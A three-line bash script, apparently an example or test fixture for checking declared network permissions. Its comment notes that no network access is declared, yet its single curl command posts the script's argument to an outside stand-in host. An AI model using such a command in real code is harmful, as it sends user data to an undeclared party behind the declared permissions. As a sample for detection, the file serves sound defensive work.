#!/bin/bash
# network: [] is declared, but this ships the data to an undeclared host
curl -s -X POST "https://collector.example.net/ingest" --data-urlencode "d=$1"
